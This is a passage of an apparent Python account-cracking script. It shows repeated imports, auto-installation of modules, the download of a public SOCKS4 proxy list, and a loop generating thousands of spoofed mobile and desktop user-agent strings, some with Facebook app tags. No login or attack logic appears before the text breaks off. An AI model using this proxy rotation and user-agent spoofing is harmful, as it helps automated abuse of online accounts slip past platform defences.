from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from datetime import datetime as dt
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
#print("WAIT INSTALLING MODULES")
#os.system("pip install bs4")
#os.system("pip install requests")
#os.system("pip install rich")
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python pankaj.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from requests.exceptions import ConnectionError as net_error
import os
from platform import uname
import pycurl, certifi
from io import BytesIO

devua2=[]
devua=[]
dev_xd = []

dev_ua = ["Mozilla/5.0 (Linux; U; Android 1.6; ar-us; SonyEricssonX10i Build/R2BA026) AppleWebKit/528.5+ (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2",
"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8",
"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
"Mozilla/5.0 (Windows; Windows NT 6.1; rv:2.0b2) Gecko/20100720 Firefox/4.0b2",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.0b4) Gecko/20100818 Firefox/4.0b4",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100308 Ubuntu/10.04 (lucid) Firefox/3.6 GTB7.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre",
"Mozilla/5.0 (X11; Linux x86_64; rv:2.0b9pre) Gecko/20110111 Firefox/4.0b9pre",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre",
"Mozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
"Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0",
"Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0",
"Mozilla/5.0 (Windows NT 5.1; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0",
"Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0",
"Opera/5.11 (Windows 98; U) [en]",
"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.12 [en]",
"Opera/6.0 (Windows 2000; U) [fr]",
"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01 [en]",
"Opera/7.03 (Windows NT 5.0; U) [en]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.10 [en]",
"Opera/9.02 (Windows XP; U; ru)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24",
"Opera/9.51 (Macintosh; Intel Mac OS X; U; en)",
"Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1",
"Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00",
"Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00",
"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
"Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
"Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.14",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)",
"Opera/9.80 (Linux armv6l ; U; CE-HTML/1.0 NETTV/3.0.1;; en) Presto/2.6.33 Version/10.60",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36 OPR/31.0.1857.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25",
"Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523 [FBAN/FBIOS;FBAV/6.0.1;FBBV/180945;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/6.0.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]",
"Mozilla/5.0 (Linux; Android 4.4.2; VS880 Build/KOT49I.VS88012A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]",
"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",
"Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
"Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36"]

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 7S'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/83.0.4103.101 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    
    aa='Mozilla/5.0 (Linux; Android 7.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Vivo Y91C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    aa='Mozilla/5.0 (X11; CrOS x86_64 15183.78.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['X11; CrOS x86_64 15183.78.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.5359.172 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (X11; CrOS armv7l 15183.78.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['X11; CrOS armv7l 15183.78.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.5359.172 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    aa='Mozilla/5.0 (X11; CrOS aarch64 15183.78.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['X11; CrOS aarch64 15183.78.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.5359.172 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    #Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36
    
    aa='Mozilla/5.0 (Linux; Android 12; SM-A135F;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 12; SM-A135F'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
    
    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    
    #Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0
    aa='Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Android 10; Xiaomi Redmi Note 9 Pro Max'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    #Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
